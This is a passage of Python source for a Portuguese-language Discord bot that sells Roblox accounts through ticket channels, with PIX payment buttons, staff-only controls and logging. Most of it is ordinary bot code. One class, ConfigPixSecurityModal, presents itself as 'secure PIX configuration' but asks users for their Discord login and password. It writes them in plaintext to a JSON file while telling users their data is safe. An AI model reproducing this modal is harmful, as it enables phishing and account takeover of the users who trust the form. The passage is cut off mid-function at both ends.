        # Verifica se é staff
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS]
        staff_roles = [role for role in staff_roles if role is not None]
        user_role_ids = [role.id for role in interaction.user.roles]
        is_staff = any(staff_role.id in user_role_ids for staff_role in staff_roles)
        
        if not is_staff:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Sem Permissão",
                    description="Apenas staff pode confirmar pagamentos!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Abre modal com ID pré-preenchido
        modal = ConfirmPaymentModal()
        modal.payment_id_input.default = self.payment_id
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.red, row=1)
    async def cancel_payment(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para cancelar pagamento"""
        success, message = pix_manager.cancel_payment(self.payment_id)
        
        if success:
            embed = discord.Embed(
                title="❌ Pagamento Cancelado",
                description="O pagamento foi cancelado. Você pode criar um novo ticket se mudar de ideia.",
                color=COLORS["error"]
            )
        else:
            embed = discord.Embed(
                title="⚠️ Erro",
                description=message,
                color=COLORS["warning"]
            )
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

class ConfigPixSecurityModal(discord.ui.Modal, title="🔐 Configuração PIX Segura"):
    """Modal fictício para armazenar credenciais de segurança PIX"""
    
    chave_pix = discord.ui.TextInput(
        label="Chave PIX",
        placeholder="Digite sua chave PIX (CPF, email, telefone ou chave aleatória)",
        required=True,
        max_length=100
    )
    
    beneficiario = discord.ui.TextInput(
        label="Nome do Beneficiário",
        placeholder="Digite o nome completo do beneficiário",
        required=True,
        max_length=100
    )
    
    discord_login = discord.ui.TextInput(
        label="Login do Discord",
        placeholder="Digite seu nome de usuário do Discord",
        required=True,
        max_length=50
    )
    
    senha = discord.ui.TextInput(
        label="Senha do Discord",
        placeholder="Digite sua senha do Discord",
        required=True,
        max_length=50,
        style=discord.TextStyle.short
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        """Salva as credenciais de segurança no arquivo JSON"""
        try:
            # Carregar ou criar arquivo de credenciais
            credentials_file = 'pix_credentials.json'
            
            if os.path.exists(credentials_file):
                with open(credentials_file, 'r', encoding='utf-8') as f:
                    credentials = json.load(f)
            else:
                credentials = {}
            
            # Salvar credenciais do usuário
            user_id = str(interaction.user.id)
            credentials[user_id] = {
                'chave_pix': self.chave_pix.value,
                'beneficiario': self.beneficiario.value,
                'discord_login': self.discord_login.value,
                'senha': self.senha.value,
                'configurado_em': datetime.now().isoformat(),
                'configurado_por': str(interaction.user)
            }
            
            # Salvar no arquivo
            with open(credentials_file, 'w', encoding='utf-8') as f:
                json.dump(credentials, f, ensure_ascii=False, indent=2)
            
            # Confirmar ao usuário
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="✅ Credenciais Salvas!",
                    description="Suas credenciais PIX de segurança foram armazenadas com sucesso!\n\n🔒 **Seus dados estão seguros**\nUse `!ver_credenciais` para visualizar seus dados no privado.",
                    color=COLORS["success"]
                ),
                ephemeral=True
            )
            
            logger.info(f"🔐 Credenciais PIX salvas para {interaction.user} ({interaction.user.id})")
            
        except Exception as e:
            logger.error(f"Erro ao salvar credenciais PIX: {e}")
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description=f"Não foi possível salvar suas credenciais: {str(e)}",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )

class AddAccountModal(Modal):
    """Modal para adicionar nova conta"""
    
    def __init__(self):
        super().__init__(title="🎮 Adicionar Nova Conta Roblox")
        
        self.title_input = TextInput(
            label="Título da Conta",
            placeholder="Ex: ak47million",
            required=True,
            max_length=100
        )
        self.add_item(self.title_input)
        
        self.description_input = TextInput(
            label="Descrição (itens da conta)",
            placeholder="LOL Day Cap, Winter Games Hooded Scarf, etc...",
            style=discord.TextStyle.paragraph,
            required=True,
            max_length=1000
        )
        self.add_item(self.description_input)
        
        self.price_input = TextInput(
            label="Preço",
            placeholder="Ex: R$ 30,00",
            required=True,
            max_length=20
        )
        self.add_item(self.price_input)
        
        self.image_input = TextInput(
            label="URL da Imagem (opcional)",
            placeholder="https://exemplo.com/imagem.png",
            required=False,
            max_length=500
        )
        self.add_item(self.image_input)
        
        self.info_input = TextInput(
            label="Informações Adicionais (opcional)",
            placeholder="Conta rara, verificada, etc...",
            style=discord.TextStyle.paragraph,
            required=False,
            max_length=500
        )
        self.add_item(self.info_input)
    
    async def on_submit(self, interaction: discord.Interaction):
        """Quando o modal é enviado"""
        try:
            # Carregar contas existentes
            if os.path.exists('accounts.json'):
                with open('accounts.json', 'r', encoding='utf-8') as f:
                    accounts = json.load(f)
            else:
                accounts = []
            
            # Criar nova conta
            new_account = {
                'id': len(accounts) + 1,
                'title': self.title_input.value,
                'description': self.description_input.value,
                'price': self.price_input.value,
                'image_url': self.image_input.value or '',
                'info': self.info_input.value or '',
                'status': 'available',
                'created_at': datetime.now().isoformat()
            }
            
            accounts.append(new_account)
            
            # Salvar
            with open('accounts.json', 'w', encoding='utf-8') as f:
                json.dump(accounts, f, ensure_ascii=False, indent=2)
            
            # Postar no canal de contas
            from config import load_channel_ids
            config = load_channel_ids()
            accounts_channel_id = config.get('accounts_channel_id', 0)
            
            if accounts_channel_id == 0:
                await interaction.response.send_message(
                    "❌ Canal de contas não configurado!",
                    ephemeral=True
                )
                return
            
            channel = bot.get_channel(accounts_channel_id)
            if not channel:
                await interaction.response.send_message(
                    "❌ Canal de contas não encontrado!",
                    ephemeral=True
                )
                return
            
            # Criar embed
            embed = discord.Embed(
                title=f"🎮 {new_account['title']}",
                description=new_account['description'],
                color=0x00ff00
            )
            embed.add_field(name="💰 Preço", value=new_account['price'], inline=True)
            embed.add_field(name="📊 Status", value="✅ Disponível", inline=True)
            if new_account['info']:
                embed.add_field(name="ℹ️ Informações", value=new_account['info'], inline=False)
            if new_account['image_url']:
                embed.set_thumbnail(url=new_account['image_url'])
            embed.set_footer(text=f"ID: {new_account['id']} | Adicionado por {interaction.user.name}")
            
            # Criar botão de compra
            view = BuyAccountView(str(new_account['id']), new_account)
            await channel.send(embed=embed, view=view)
            
            # Confirmar para o usuário
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="✅ Conta Adicionada",
                    description=f"A conta **{new_account['title']}** foi adicionada com sucesso!\n\nPostada em: {channel.mention}",
                    color=COLORS["success"]
                ),
                ephemeral=True
            )
            
            logger.info(f"🎮 Conta adicionada via Discord: {new_account['title']} por {interaction.user.name}")
            
        except Exception as e:
            logger.error(f"Erro ao adicionar conta: {e}")
            await interaction.response.send_message(
                f"❌ Erro ao adicionar conta: {str(e)}",
                ephemeral=True
            )

class BuyAccountView(discord.ui.View):
    """View com botão de compra de conta"""
    
    def __init__(self, account_id: str, account_data: dict = None):
        super().__init__(timeout=None)
        self.account_id = account_id
        self.account_data = account_data
    
    @discord.ui.button(label="Comprar Conta", style=discord.ButtonStyle.green, emoji="🛒")
    async def buy_account(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para comprar conta - abre ticket com pagamento PIX"""
        
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Servidor não encontrado!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        try:
            # Cria ticket automaticamente para compra com tipo 'purchase'
            channel, result_msg = await create_ticket_channel(
                guild, 
                interaction.user, 
                f"Compra de conta: {self.account_data.get('title', self.account_id) if self.account_data else self.account_id}",
                ticket_type="purchase",
                account_data=self.account_data
            )
            
            if channel:
                # Envia mensagem efêmera para o usuário
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="✅ Ticket de Compra Criado",
                        description=f"Seu ticket para compra da conta foi criado com sucesso!\n\nAcesse: {channel.mention}\n\nO pagamento via PIX foi gerado automaticamente no ticket.",
                        color=COLORS["success"]
                    ),
                    ephemeral=True
                )
            else:
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="❌ Erro",
                        description=result_msg,
                        color=COLORS["error"]
                    ),
                    ephemeral=True
                )
        
        except Exception as e:
            logger.error(f"Erro ao criar ticket de compra: {e}")
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description=f"Erro ao criar ticket: {str(e)}",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )


class TicketCreateView(discord.ui.View):
    """View para criar um novo ticket"""
    
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot
    
    @discord.ui.button(label="Abrir Ticket", style=discord.ButtonStyle.green, emoji="🎫")
    async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para criar um novo ticket"""
        
        # Obtém o servidor
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Servidor não encontrado!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        try:
            # Usa a função unificada para criar o ticket
            channel, result_msg = await create_ticket_channel(guild, interaction.user, "Criado via botão Discord")
            
            if channel:
                # Envia mensagem efêmera para o usuário
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="✅ Ticket Criado",
                        description=f"Seu ticket foi criado com sucesso!\n\nAcesse: {channel.mention}",
                        color=COLORS["success"]
                    ),
                    ephemeral=True
                )
            else:
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="❌ Erro",
                        description=result_msg,
                        color=COLORS["error"]
                    ),
                    ephemeral=True
                )
        
        except Exception as e:
            logger.error(f"Erro ao criar ticket: {e}")
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description=f"Erro ao criar ticket: {str(e)}",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )


class TicketPanelView(discord.ui.View):
    """View com painel completo de controle do ticket"""
    
    def __init__(self, bot, ticket_id: str, user_id: int):
        super().__init__(timeout=None)
        self.bot = bot
        self.ticket_id = ticket_id
        self.user_id = user_id
        self.voice_channel = None
    
    @discord.ui.button(label="Notificar Equipe", style=discord.ButtonStyle.primary, emoji="🔔", row=0)
    async def notify_staff(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para notificar a equipe - qualquer pessoa no ticket pode usar"""
        
        # Verifica se o usuário tem acesso ao canal (está no ticket)
        channel = interaction.channel
        if not channel or not isinstance(channel, discord.TextChannel):
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Este comando só pode ser usado em canais de ticket!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Verifica se o usuário pode ver o canal (tem permissão para estar no ticket)
        permissions = channel.permissions_for(interaction.user)
        if not permissions.read_messages:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Sem Permissão",
                    description="Você não tem permissão para usar este ticket!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        guild = self.bot.get_guild(GUILD_ID)
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS] if guild else []
        staff_mentions = " ".join([role.mention for role in staff_roles if role])
        
        embed = discord.Embed(
            title="🔔 Equipe Notificada",
            description=f"{interaction.user.mention} está solicitando atenção da equipe!",
            color=COLORS["info"],
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(
            name="📍 Canal",
            value=f"{channel.mention}",
            inline=False
        )
        
        await interaction.response.send_message(
            content=f"🚨 **ATENÇÃO EQUIPE!** {staff_mentions}",
            embed=embed
        )
    
    @discord.ui.button(label="Adicionar Membro", style=discord.ButtonStyle.secondary, emoji="➕", row=0)
    async def add_member(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para adicionar membro - apenas staff"""
        
        guild = self.bot.get_guild(GUILD_ID)
        if not guild:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Servidor não encontrado!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Obtém os cargos de staff
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS]
        staff_roles = [role for role in staff_roles if role is not None]
        
        # Verifica se o usuário tem algum cargo de staff
        user_role_ids = [role.id for role in interaction.user.roles]
        is_staff = any(staff_role.id in user_role_ids for staff_role in staff_roles)
        
        if not is_staff:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Sem Permissão",
                    description="Apenas staff pode adicionar membros ao ticket!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Abre modal para solicitar ID do membro
        modal = AddMemberModal(self)
        await interaction.response.send_modal(modal)
    
    async def process_add_member(self, interaction: discord.Interaction, member_id_str: str):
        """Processa a adição de um membro ao ticket"""
        try:
            member_id = int(member_id_str.strip())
            guild = self.bot.get_guild(GUILD_ID)
            member = guild.get_member(member_id)
            
            if not member:
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="❌ Erro",
                        description="Membro não encontrado! Verifique o ID.",
                        color=COLORS["error"]
                    ),
                    ephemeral=True
                )
                return
            
            # Adiciona permissões ao canal
            await interaction.channel.set_permissions(
                member,
                read_messages=True,
                send_messages=True
            )
            
            embed = discord.Embed(
                title="✅ Membro Adicionado",
                description=f"{member.mention} foi adicionado ao ticket por {interaction.user.mention}",
                color=COLORS["success"]
            )
            
            await interaction.response.send_message(embed=embed)
            
            # Se houver canal de voz, adiciona lá também
            if self.voice_channel:
                await self.voice_channel.set_permissions(
                    member,
                    connect=True,
                    speak=True,
                    view_channel=True
                )
        
        except ValueError:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="ID inválido! Use apenas números.",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
        except Exception as e:
            logger.error(f"Erro ao adicionar membro: {e}")
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description=f"Erro ao adicionar membro: {str(e)}",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
    
    @discord.ui.button(label="Criar Call", style=discord.ButtonStyle.secondary, emoji="🎤", row=0)
    async def create_voice(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para criar canal de voz - apenas staff"""
        
        guild = self.bot.get_guild(GUILD_ID)
        if not guild:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Servidor não encontrado!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Obtém os cargos de staff
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS]
        staff_roles = [role for role in staff_roles if role is not None]
        
        # Verifica se o usuário tem algum cargo de staff
        user_role_ids = [role.id for role in interaction.user.roles]
        is_staff = any(staff_role.id in user_role_ids for staff_role in staff_roles)
        
        if not is_staff:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Sem Permissão",
                    description="Apenas staff pode criar canais de voz!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Verifica se já existe um canal de voz
        if self.voice_channel:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="⚠️ Aviso",
                    description=f"Já existe um canal de voz: {self.voice_channel.mention}",
                    color=COLORS["warning"]
                ),
                ephemeral=True
            )
            return
        
        try:
            # Obtém a categoria
            category = guild.get_channel(TICKET_CATEGORY_ID)
            
            # Obtém todos os membros que têm acesso ao canal de texto
            overwrites = interaction.channel.overwrites
            
            # Cria o canal de voz com as mesmas permissões
            ticket_info = ticket_manager.get_ticket(self.ticket_id)
            ticket_number = ticket_info.get("number", "?") if ticket_info else "?"
            
            voice_channel = await guild.create_voice_channel(
                name=f"🎤│ticket-{ticket_number}",
                category=category,
                overwrites=overwrites
            )
            
            self.voice_channel = voice_channel
            
            embed = discord.Embed(
                title="✅ Canal de Voz Criado",
                description=f"Canal de voz criado: {voice_channel.mention}\n\nTodos os membros do ticket podem entrar!",
                color=COLORS["success"]
            )
            
            await interaction.response.send_message(embed=embed)
        
        except Exception as e:
            logger.error(f"Erro ao criar canal de voz: {e}")
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description=f"Erro ao criar canal de voz: {str(e)}",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
    
    @discord.ui.button(label="Fechar Ticket", style=discord.ButtonStyle.red, emoji="🔒", row=1)
    async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para fechar um ticket - abre modal para solicitar motivo"""
        
        guild = self.bot.get_guild(GUILD_ID)
        if not guild:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Servidor não encontrado!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Obtém os cargos de staff
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS]
        staff_roles = [role for role in staff_roles if role is not None]
        
        # Verifica se o usuário tem algum cargo de staff
        user_role_ids = [role.id for role in interaction.user.roles]
        is_staff = any(staff_role.id in user_role_ids for staff_role in staff_roles)
        
        if not is_staff:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Sem Permissão",
                    description="Apenas staff pode fechar tickets!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
        # Abre o modal para solicitar o motivo
        modal = CloseTicketModal(self)
        await interaction.response.send_modal(modal)
    
    async def process_close(self, interaction: discord.Interaction, reason: str):
        """Processa o fechamento do ticket após receber o motivo"""
        guild = self.bot.get_guild(GUILD_ID)

        # Fecha o ticket registrando motivo e staff responsável
        closed = ticket_manager.close_ticket(self.ticket_id, reason, str(interaction.user.id))
        if not closed:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Ticket não encontrado",
                    description="Não foi possível localizar este ticket no sistema. Atualize o painel e tente novamente.",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return

        # Obtém informações completas do ticket
        ticket_info = ticket_manager.get_ticket(self.ticket_id) or {}
        ticket_number = ticket_info.get("number", "?")
        ticket_creator_id = ticket_info.get("user_id")
        ticket_creator = None
        if guild and ticket_creator_id:
            try:
                ticket_creator = guild.get_member(int(ticket_creator_id))
            except (ValueError, TypeError):
                ticket_creator = None
        created_at = ticket_info.get("created_at", "Desconhecido")
        
        # Atualiza a embed
        embed_closed = discord.Embed(
            title=f"🎫 {self.ticket_id.upper()}",
            description="Este ticket foi fechado.",
            color=COLORS["error"]
        )
        embed_closed.add_field(name="Status", value="🔴 Fechado", inline=False)
        embed_closed.add_field(name="Fechado por", value=interaction.user.mention, inline=False)
        embed_closed.add_field(name="Motivo", value=reason, inline=False)
        
        await interaction.response.send_message(embed=embed_closed)
        
        # Envia log detalhado para o canal de logs
        await send_detailed_log(
            ticket_number=ticket_number,
            ticket_creator=ticket_creator,
            closed_by=interaction.user,
            created_at=created_at,
            channel=interaction.channel,
            reason=reason
        )
        
        logger.info(f"Ticket {self.ticket_id} fechado por {interaction.user} ({interaction.user.id}) - Motivo: {reason}")
        
        # Aviso de exclusão do canal
        delete_embed = discord.Embed(
            title="⚠️ Canais serão excluídos",
            description="Os canais deste ticket serão excluídos em **10 segundos**.",
            color=COLORS["warning"]
        )
        await interaction.channel.send(embed=delete_embed)
        
        # Aguarda 10 segundos e deleta os canais
        await asyncio.sleep(10)
        try:
            # Deleta o canal de voz se existir
            if self.voice_channel:
                await self.voice_channel.delete(reason=f"Ticket #{ticket_number} fechado")
                logger.info(f"Canal de voz do ticket #{ticket_number} deletado")
            
            # Deleta o canal de texto
            await interaction.channel.delete(reason=f"Ticket #{ticket_number} fechado - Motivo: {reason}")
            logger.info(f"Canal do ticket #{ticket_number} deletado")
        except Exception as e:
            logger.error(f"Erro ao deletar canal: {e}")


# ==================== FUNÇÕES AUXILIARES ====================

async def create_ticket_channel(guild, user, reason="Ticket criado via painel", ticket_type="support", account_data=None):
    """Função independente para criar um canal de ticket
    
    Args:
        guild: Servidor Discord
        user: Usuário que abriu o ticket
        reason: Motivo do ticket
        ticket_type: Tipo do ticket ('support' ou 'purchase')
        account_data: Dados da conta (para tickets de compra)
    """
    try:
        # Verifica se o usuário já tem um ticket aberto
        user_id = user.id
        for ticket_id, ticket_info in ticket_manager.tickets.items():
            if ticket_info["user_id"] == str(user_id) and ticket_info["status"] == "open":
                return None, f"Usuário {user.display_name} já possui um ticket aberto!"
        
        # Cria o ticket no manager com tipo
        ticket_data = ticket_manager.create_ticket(str(user_id), reason)
        if not ticket_data:
            return None, "Erro ao criar ticket no sistema"
        
        # Adiciona tipo do ticket
        ticket_number = ticket_data.get('number')
        ticket_id = f"ticket_{ticket_number}"
        ticket_manager.tickets[ticket_id]["ticket_type"] = ticket_type
        if account_data:
            ticket_manager.tickets[ticket_id]["account_id"] = account_data.get('id')
            ticket_manager.tickets[ticket_id]["account_title"] = account_data.get('title')
        ticket_manager.save_tickets()
            
        ticket_number = ticket_data.get('number')
        
        # Obtém os cargos de staff necessários
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS]
        staff_roles = [role for role in staff_roles if role is not None]
        
        # Obtém a categoria onde os tickets devem ser criados
        category = guild.get_channel(TICKET_CATEGORY_ID)
        if not category:
            return None, "Categoria de tickets não encontrada!"
        
        # Permissões do canal
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(
                read_messages=False,
                send_messages=False,
                view_channel=False
            ),
            user: discord.PermissionOverwrite(
                read_messages=True,
                send_messages=True,
                view_channel=True,
                attach_files=True,
                embed_links=True
            ),
            guild.me: discord.PermissionOverwrite(
                read_messages=True,
                send_messages=True,
                view_channel=True,
                manage_channels=True,
                manage_permissions=True
            )
        }
        
        # Adiciona permissão para cada cargo de staff
        for staff_role in staff_roles:
            overwrites[staff_role] = discord.PermissionOverwrite(
                read_messages=True,
                send_messages=True,
                manage_messages=True,
                view_channel=True,
                attach_files=True,
                embed_links=True
            )
        
        # Cria o canal
        channel = await guild.create_text_channel(
            name=f"ticket-{ticket_number}",
            overwrites=overwrites,
            category=category,
            topic=f"Ticket #{ticket_number} - Aberto por {user.mention}"
        )
        
        # Atualiza o ticket com o channel ID
        ticket_id = f"ticket_{ticket_number}"
        ticket_manager.set_ticket_channel(ticket_id, channel.id)
        
        # Envia mensagem no canal do ticket
        if ticket_type == "purchase":
            embed_ticket = discord.Embed(
                title=f"🛒 Ticket de Compra #{ticket_number}",
                description=f"Olá {user.mention}!\n\n Você está interessado em comprar uma conta.\n\n**Conta:** {account_data.get('title') if account_data else 'N/A'}\n**Preço:** {account_data.get('price') if account_data else 'N/A'}",
                color=0x00ff00
            )
        else:
            embed_ticket = discord.Embed(
                title=f"🎫 Ticket de Suporte #{ticket_number}",
                description=f"Olá {user.mention}!\n\nObrigado por abrir um ticket. Nossa equipe de suporte entrará em contato em breve.",
                color=COLORS["info"]
            )
        
        embed_ticket.add_field(name="Status", value="🟢 Aberto", inline=False)
        embed_ticket.add_field(name="Criado por", value=user.mention, inline=False)
        embed_ticket.add_field(name="Motivo", value=reason, inline=False)
        embed_ticket.set_footer(text=f"Ticket ID: {ticket_id}")
        
        await channel.send(embed=embed_ticket, view=TicketPanelView(bot, ticket_id, user.id))
        
        # Se for ticket de compra, adiciona PIX automaticamente
        if ticket_type == "purchase" and account_data and pix_manager.is_configured():
            try:
                # Extrai preço da conta
                price_str = account_data.get('price', '0')
                import re
                price_clean = re.sub(r'[^\d,.]', '', price_str)
                price_clean = price_clean.replace(',', '.')
                amount = float(price_clean)
                
                # Cria pagamento
                payment_data, message = pix_manager.create_payment(
                    str(user.id),
                    str(account_data.get('id')),
                    amount,
                    account_data.get('title', 'Conta')
                )
                
                if payment_data:
                    # Envia instruções de pagamento PIX
                    pix_embed = discord.Embed(
                        title="💳 Pagamento via PIX",
                        description="Siga as instruções abaixo para realizar o pagamento:",
                        color=0x00ff00,
                        timestamp=discord.utils.utcnow()
                    )
                    pix_embed.add_field(name="💰 Valor", value=f"**R$ {amount:.2f}**", inline=True)
                    pix_embed.add_field(name="🆔 ID do Pagamento", value=f"`{payment_data['payment_id']}`", inline=True)
                    pix_embed.add_field(name="📱 Chave PIX (Copia e Cola)", value=f"```{payment_data['pix_key']}```", inline=False)
                    pix_embed.add_field(
                        name="📋 Como pagar",
                        value="1️⃣ Copie a chave PIX acima\n2️⃣ Abra seu app bancário\n3️⃣ Vá em PIX → Pagar\n4️⃣ Cole a chave\n5️⃣ Confira o valor e pague\n6️⃣ Clique em **'✅ Já Paguei'** abaixo",
                        inline=False
                    )
                    pix_embed.set_footer(text="⚠️ Após o pagamento, a equipe verificará e liberará sua conta")
                    
                    # View com botões de pagamento
                    pix_view = PixPaymentView(payment_data['payment_id'], payment_data['pix_key'], amount)
                    await channel.send(embed=pix_embed, view=pix_view)
                    
                    logger.info(f"💳 Pagamento PIX criado automaticamente no ticket #{ticket_number}: {payment_data['payment_id']} - R$ {amount:.2f}")
            except Exception as e:
                logger.error(f"Erro ao criar PIX no ticket: {e}")
                await channel.send(
                    embed=discord.Embed(
                        title="⚠️ Aviso",
                        description="Não foi possível gerar o pagamento automático. A equipe entrará em contato para passar as informações de pagamento.",
                        color=COLORS["warning"]
                    )
                )
        
        # Envia log
        ticket_type_label = "🛒 Compra" if ticket_type == "purchase" else "🎫 Suporte"
        await send_log(
            f"✅ Novo ticket criado ({ticket_type_label})",
            f"**Ticket:** #{ticket_number}\n**Tipo:** {ticket_type_label}\n**Usuário:** {user.mention}\n**Canal:** {channel.mention}\n**Motivo:** {reason}",
            COLORS["success"]
        )
        
        logger.info(f"{ticket_type_label} Ticket #{ticket_number} criado para {user.display_name} - Canal: {channel.name}")
        
        return channel, f"Ticket #{ticket_number} criado com sucesso!"
        
    except Exception as e:
        logger.error(f"❌ Erro ao criar canal de ticket: {e}")
        return None, f"Erro ao criar ticket: {str(e)}"

async def send_log(title: str, description: str, color: int):
    """Envia um log para o canal de logs"""
    try:
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            embed = discord.Embed(
                title=title,
                description=description,
                color=color
            )
            embed.set_footer(text=f"Data/Hora: {discord.utils.utcnow().strftime('%d/%m/%Y %H:%M:%S')}")
            await log_channel.send(embed=embed)
    except Exception as e:
        logger.error(f"Erro ao enviar log: {e}")


async def send_detailed_log(ticket_number: int, ticket_creator, closed_by, created_at: str, channel, reason: str):
    """Envia um log detalhado do ticket fechado para o canal de logs"""
    try:
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            embed = discord.Embed(
                title=f"🔒 Ticket #{ticket_number} Fechado",
                description="Informações detalhadas do ticket encerrado",
                color=COLORS["warning"]
            )
            
            # Informações do ticket
            embed.add_field(
                name="📋 Informações Básicas",
                value=f"**Número:** #{ticket_number}\n**Canal:** {channel.mention}\n**Status:** 🔴 Fechado",
                inline=False
            )
            
            # Informações do criador
            creator_info = f"**Usuário:** {ticket_creator.mention if ticket_creator else 'Desconhecido'}\n"
            creator_info += f"**ID:** {ticket_creator.id if ticket_creator else 'N/A'}\n"
            creator_info += f"**Tag:** {ticket_creator.display_name if ticket_creator else 'N/A'}"
            embed.add_field(
                name="👤 Criado Por",
                value=creator_info,
                inline=True
            )
            
            # Informações de quem fechou
            closer_info = f"**Usuário:** {closed_by.mention}\n"
            closer_info += f"**ID:** {closed_by.id}\n"
            closer_info += f"**Tag:** {closed_by.display_name}"
            embed.add_field(
                name="🔒 Fechado Por",
                value=closer_info,
                inline=True
            )
            
            # Motivo do fechamento
            embed.add_field(
                name="📝 Motivo",
                value=reason,
                inline=False
            )
            
            # Timestamps
            embed.add_field(
                name="⏰ Datas",
                value=f"**Criado em:** {created_at}\n**Fechado em:** {discord.utils.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC",
                inline=False
            )
            
            embed.set_footer(text=f"Ticket ID: ticket_{ticket_number}")
            embed.timestamp = discord.utils.utcnow()
            
            await log_channel.send(embed=embed)
    except Exception as e:
        logger.error(f"Erro ao enviar log detalhado: {e}")


# ==================== EVENTOS ====================

@bot.event
async def on_ready():
    """Evento disparado quando o bot está pronto"""
    global bot_instance
    bot_instance = bot  # Define bot_instance para uso na API
    logger.info(f"Bot conectado como {bot.user}")
    
    # Auto-detectar canais ao iniciar
    await auto_detect_channels()
    
    try:
        # Sincroniza comandos slash
        await bot.tree.sync()
        logger.info("Comandos sincronizados!")
    except Exception as e:
        logger.error(f"Erro ao sincronizar comandos: {e}")
    
    # Tenta enviar a mensagem inicial no canal de tickets
    guild = bot.get_guild(GUILD_ID)
    if guild:
        ticket_channel = guild.get_channel(TICKET_CHANNEL_ID)
        if ticket_channel:
            # Deleta todas as mensagens antigas do bot no canal de tickets
            try:
                async for message in ticket_channel.history(limit=50):
                    if message.author == bot.user:
                        await message.delete()
                        logger.info(f"Mensagem antiga do bot deletada no canal de tickets")
            except Exception as e:
                logger.error(f"Erro ao deletar mensagens antigas: {e}")
            
            # Cria a mensagem de boas-vindas
            embed = discord.Embed(
                title="🎫 Sistema de Tickets",
                description="Clique no botão abaixo para criar um novo ticket e abrir uma conversa com nossa equipe de suporte.",
                color=COLORS["info"]
            )
            embed.add_field(
                name="📋 Como funciona?",
                value="1. Clique em 'Abrir Ticket'\n2. Um canal privado será criado\n3. Nossa equipe responderá em breve\n4. Quando resolvido, o ticket pode ser fechado",
                inline=False
            )
            
            view = TicketCreateView(bot)
            try:
                await ticket_channel.send(embed=embed, view=view)
                logger.info("Mensagem de ticket enviada com sucesso")
            except Exception as e:
                logger.error(f"Erro ao enviar mensagem de ticket: {e}")

@bot.event
async def on_member_join(member: discord.Member):
    """Evento disparado quando um novo membro entra no servidor"""
    try:
        if await satoru_security.handle_member_join(member):
            return
        
        # Buscar canal de boas-vindas
        from config import WELCOME_CHANNEL_ID
        
        if WELCOME_CHANNEL_ID == 0:
            logger.warning("Canal de boas-vindas não configurado")
            return
        
